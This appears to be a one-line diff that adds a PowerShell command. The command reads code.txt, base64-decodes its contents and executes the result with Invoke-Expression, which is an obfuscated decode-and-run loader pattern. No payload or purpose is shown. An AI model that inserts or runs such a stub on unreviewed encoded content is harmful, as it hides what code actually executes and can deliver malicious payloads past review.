@@ -1,0 +1,1 @@
+$rawcode = get-content .\code.txt; $runcode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($rawcode)); Invoke-Expression -command $runcode
